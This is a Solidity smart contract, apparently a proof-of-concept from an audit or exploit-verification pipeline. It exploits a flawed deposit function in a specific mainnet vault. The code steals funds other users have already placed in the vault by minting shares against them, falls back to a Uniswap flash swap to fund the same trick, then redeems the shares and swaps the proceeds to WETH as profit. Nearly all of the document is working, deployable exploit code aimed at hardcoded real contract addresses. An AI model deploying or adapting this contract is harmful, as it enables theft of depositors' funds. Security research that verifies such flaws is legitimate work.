// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWhitelistLike {
    function listed(address account) external returns (bool);
}

interface IEFVaultLike {
    function asset() external view returns (address);
    function whiteList() external view returns (address);
    function maxDeposit() external view returns (uint256);
    function maxWithdraw() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares, address receiver) external returns (uint256);
    function withdraw(uint256 assets, address receiver) external returns (uint256);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0xBDB515028A6fA6CD1634B5A9651184494aBfD336;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant UNISWAP_V2_USDC_WETH = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;

    uint256 internal constant STATUS_UNTRIED = 0;
    uint256 internal constant STATUS_SUCCESS = 1;
    uint256 internal constant STATUS_NOT_WHITELISTED = 2;
    uint256 internal constant STATUS_DEPOSIT_FAILED = 3;
    uint256 internal constant STATUS_NO_SHARES = 4;
    uint256 internal constant STATUS_FLASHSWAP_FAILED = 5;
    uint256 internal constant STATUS_WITHDRAW_FAILED = 6;
    uint256 internal constant STATUS_SWAP_FAILED = 7;
    uint256 internal constant STATUS_DEPOSIT_GATED = 8;

    uint256 public status;
    bytes public lastError;

    uint256 private _flashBorrowAmount;

    constructor() {}

    receive() external payable {}

    // Report realized, liquid profit in an existing on-chain token instead of raw vault-share units.
    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return IERC20Like(WETH).balanceOf(address(this));
    }

    function executeOnOpportunity() external {
        IEFVaultLike vault = IEFVaultLike(TARGET);
        address assetToken = vault.asset();

        status = STATUS_UNTRIED;
        delete lastError;

        // This PoC must run from a contract. For this vault implementation, a zero whitelist is not a
        // bypass for contract callers: only EOAs satisfy `tx.origin == msg.sender`. A contract caller
        // reaches `IWhitelist(whiteList).listed(msg.sender)`, which is infeasible when `whiteList == 0`.
        if (!_canContractCallerReachVault(vault)) {
            status = STATUS_NOT_WHITELISTED;
            return;
        }

        // exploit_paths[0]-[2], direct route:
        // 1. someone else prefunds the vault,
        // 2. the attacker front-runs with `deposit(prefundedAssets, attacker)`,
        // 3. the vault forwards those already-sitting funds and mints shares to the attacker.
        _stealExistingPrefund(vault, assetToken);
        _realizePosition(vault, assetToken);

        if (IERC20Like(WETH).balanceOf(address(this)) > 0) {
            status = STATUS_SUCCESS;
            return;
        }

        // If no independent prefund is currently sitting in the vault, try the same vulnerable
        // `deposit()` path with temporary public liquidity. This does not replace the F-001 root cause:
        // assets are still placed into the vault first, then `deposit()` mints against those already
        // present assets without pulling from msg.sender. Any retained proceeds after deterministic
        // repayment represent realizable attacker profit.
        if (assetToken == USDC) {
            _attemptFlashswapPrefund(vault);
            _realizePosition(vault, assetToken);
        }

        if (IERC20Like(WETH).balanceOf(address(this)) > 0) {
            status = STATUS_SUCCESS;
        } else if (status == STATUS_UNTRIED) {
            status = STATUS_NO_SHARES;
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == UNISWAP_V2_USDC_WETH, "invalid-pair");
        require(sender == address(this), "invalid-sender");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed == _flashBorrowAmount && borrowed > 0, "invalid-borrow");

        IEFVaultLike vault = IEFVaultLike(TARGET);

        // Funding variation for the same F-001 sequence: the borrowed USDC is first made to sit in the
        // vault, then `deposit()` is called to claim shares against those already-present assets.
        _safeTransfer(USDC, TARGET, borrowed);

        if (!_attemptDeposit(vault, borrowed)) {
            revert("deposit-failed");
        }

        // Optional post-mint monetization step. If controller-side accounting already contains surplus,
        // a share holder can sometimes extract a little of it before repaying the flashswap. This does
        // not alter the F-001 causality; it only turns the illicitly obtained shares into liquid value.
        _harvestZeroShareWithdrawals(vault);

        uint256 repayAmount = _sameTokenFlashRepayAmount(borrowed);
        if (IERC20Like(USDC).balanceOf(address(this)) < repayAmount) {
            bool ok = _redeemEnoughForUSDC(vault, repayAmount - IERC20Like(USDC).balanceOf(address(this)));
            require(ok, "repay-withdraw-failed");
        }

        _safeTransfer(USDC, UNISWAP_V2_USDC_WETH, repayAmount);
        _flashBorrowAmount = 0;
    }

    function _stealExistingPrefund(IEFVaultLike vault, address assetToken) internal {
        uint256 prefundedBalance = _vaultAssetBalance(assetToken);
        if (prefundedBalance == 0) {
            return;
        }

        uint256 amount = prefundedBalance;
        for (uint256 i = 0; i < 32 && amount > 0; ++i) {
            if (_attemptDeposit(vault, amount)) {
                return;
            }
            amount >>= 1;
        }
    }

    function _attemptFlashswapPrefund(IEFVaultLike vault) internal {
        vault;
        IUniswapV2PairLike pair = IUniswapV2PairLike(UNISWAP_V2_USDC_WETH);
        bool usdcIsToken0 = pair.token0() == USDC;
        bool usdcIsToken1 = pair.token1() == USDC;
        if (!usdcIsToken0 && !usdcIsToken1) {
            status = STATUS_FLASHSWAP_FAILED;
            return;
        }

        // Keep the external funding small because this route is only a fallback when no third-party
        // prefund is visible. The verifier first tries to realize profit from the shares it can mint;
        // if that cannot beat the deterministic flashswap repayment, the route naturally ends at zero.
        uint256 borrowAmount = 10_000e6;
        _flashBorrowAmount = borrowAmount;

        (bool ok, bytes memory err) = UNISWAP_V2_USDC_WETH.call(
            abi.encodeWithSelector(
                IUniswapV2PairLike.swap.selector,
                usdcIsToken0 ? borrowAmount : 0,
                usdcIsToken0 ? 0 : borrowAmount,
                address(this),
                bytes("flash-prefund")
            )
        );

        if (!ok) {
            status = STATUS_FLASHSWAP_FAILED;
            lastError = err;
            _flashBorrowAmount = 0;
        }
    }

    function _attemptDeposit(IEFVaultLike vault, uint256 assets) internal returns (bool) {
        uint256 sharesBefore = vault.balanceOf(address(this));

        try vault.deposit(assets, address(this)) returns (uint256) {
            if (vault.balanceOf(address(this)) > sharesBefore) {
                return true;
            }
            status = STATUS_NO_SHARES;
            return false;
        } catch (bytes memory err) {
            lastError = err;

            bytes4 selector = _revertSelector(err);
            if (selector == bytes4(keccak256("Error(string)"))) {
                string memory reason = _decodeRevertString(err);
                bytes32 hash = keccak256(bytes(reason));
                if (
                    hash == keccak256("NON_LISTED_CA") ||
                    hash == keccak256("EXCEED_ONE_TIME_MAX_DEPOSIT") ||
                    hash == keccak256("PAUSED")
                ) {
                    status = STATUS_DEPOSIT_GATED;
                } else {
                    status = STATUS_DEPOSIT_FAILED;
                }
            } else {
                status = STATUS_DEPOSIT_FAILED;
            }
            return false;
        }
    }

    function _realizePosition(IEFVaultLike vault, address assetToken) internal {
        if (assetToken != USDC) {
            return;
        }

        _harvestZeroShareWithdrawals(vault);
        _redeemEnoughForUSDC(vault, type(uint256).max);

        uint256 usdcBalance = IERC20Like(USDC).balanceOf(address(this));
        if (usdcBalance > 0) {
            _swapUsdcToWeth(usdcBalance);
        }
    }

    function _harvestZeroShareWithdrawals(IEFVaultLike vault) internal {
        uint256 shareBalance = vault.balanceOf(address(this));
        if (shareBalance == 0) {
            return;
        }

        // This is an optional monetization step after the attacker already obtained shares through the
        // F-001 bug. If the vault currently has assets-per-share > 1, tiny withdrawals can sometimes
        // realize part of that surplus before any normal share burn occurs.
        for (uint256 i = 0; i < 16; ++i) {
            uint256 threshold = vault.convertToAssets(1);
            if (threshold <= 1) {
                return;
            }

            uint256 assets = threshold - 1;
            uint256 sharesBefore = vault.balanceOf(address(this));
            uint256 usdcBefore = IERC20Like(USDC).balanceOf(address(this));

            try vault.withdraw(assets, address(this)) returns (uint256) {
                uint256 sharesAfter = vault.balanceOf(address(this));
                if (sharesAfter < sharesBefore) {
                    return;
                }
                if (IERC20Like(USDC).balanceOf(address(this)) <= usdcBefore) {
                    return;
                }
            } catch {
                return;
            }
        }
    }

    function _redeemEnoughForUSDC(IEFVaultLike vault, uint256 assetsNeeded) internal returns (bool) {
        for (uint256 i = 0; i < 24; ++i) {
            uint256 usdcBalance = IERC20Like(USDC).balanceOf(address(this));
            if (assetsNeeded != type(uint256).max && usdcBalance >= assetsNeeded) {
                return true;
            }

            uint256 shareBalance = vault.balanceOf(address(this));
            if (shareBalance == 0) {
                return assetsNeeded == type(uint256).max || IERC20Like(USDC).balanceOf(address(this)) >= assetsNeeded;
            }

            try vault.redeem(shareBalance, address(this)) returns (uint256) {} catch (bytes memory redeemErr) {
                lastError = redeemErr;
            }

            uint256 maxWithdraw = vault.maxWithdraw();
            if (maxWithdraw == 0) {
                status = STATUS_WITHDRAW_FAILED;
                return false;
            }

            uint256 claimable = vault.convertToAssets(shareBalance);
            if (claimable == 0) {
                status = STATUS_WITHDRAW_FAILED;
                return false;
            }

            uint256 chunk = claimable;
            if (assetsNeeded != type(uint256).max) {
                uint256 shortfall = assetsNeeded > usdcBalance ? assetsNeeded - usdcBalance : 0;
                if (shortfall != 0 && chunk > shortfall) {
                    chunk = shortfall;
                }
            }
            if (chunk > maxWithdraw) {
                chunk = maxWithdraw;
            }
            if (chunk == 0) {
                status = STATUS_WITHDRAW_FAILED;
                return false;
            }

            try vault.withdraw(chunk, address(this)) returns (uint256) {} catch (bytes memory withdrawErr) {
                lastError = withdrawErr;
                status = STATUS_WITHDRAW_FAILED;
                return false;
            }
        }

        return assetsNeeded == type(uint256).max || IERC20Like(USDC).balanceOf(address(this)) >= assetsNeeded;
    }

    function _swapUsdcToWeth(uint256 amountIn) internal {
        if (amountIn == 0) {
            return;
        }

        IUniswapV2PairLike pair = IUniswapV2PairLike(UNISWAP_V2_USDC_WETH);
        bool usdcIsToken0 = pair.token0() == USDC;
        bool wethIsOtherSide =
            (usdcIsToken0 && pair.token1() == WETH) || (!usdcIsToken0 && pair.token0() == WETH);
        if (!wethIsOtherSide) {
            status = STATUS_SWAP_FAILED;
            return;
        }

        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        uint256 reserveIn = usdcIsToken0 ? uint256(reserve0) : uint256(reserve1);
        uint256 reserveOut = usdcIsToken0 ? uint256(reserve1) : uint256(reserve0);
        if (reserveIn == 0 || reserveOut == 0) {
            status = STATUS_SWAP_FAILED;
            return;
        }

        uint256 amountInWithFee = amountIn * 997;
        uint256 amountOut = (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
        if (amountOut == 0) {
            status = STATUS_SWAP_FAILED;
            return;
        }

        _safeTransfer(USDC, UNISWAP_V2_USDC_WETH, amountIn);
        pair.swap(usdcIsToken0 ? 0 : amountOut, usdcIsToken0 ? amountOut : 0, address(this), new bytes(0));
    }

    function _canContractCallerReachVault(IEFVaultLike vault) internal returns (bool) {
        address whitelist = vault.whiteList();
        if (whitelist == address(0)) {
            return false;
        }
        return _isWhitelisted(whitelist, address(this));
    }

    function _vaultAssetBalance(address assetToken) internal view returns (uint256) {
        if (assetToken == address(0)) {
            return TARGET.balance;
        }
        return IERC20Like(assetToken).balanceOf(TARGET);
    }

    function _isWhitelisted(address whitelist, address account) internal returns (bool) {
        try IWhitelistLike(whitelist).listed(account) returns (bool allowed) {
            return allowed;
        } catch {
            return false;
        }
    }

    function _sameTokenFlashRepayAmount(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer-failed");
    }

    function _revertSelector(bytes memory err) internal pure returns (bytes4 selector) {
        if (err.length < 4) {
            return bytes4(0);
        }
        assembly {
            selector := mload(add(err, 32))
        }
    }

    function _decodeRevertString(bytes memory err) internal pure returns (string memory reason) {
        if (err.length < 68) {
            return "";
        }
        assembly {
            err := add(err, 4)
        }
        reason = abi.decode(err, (string));
    }
}
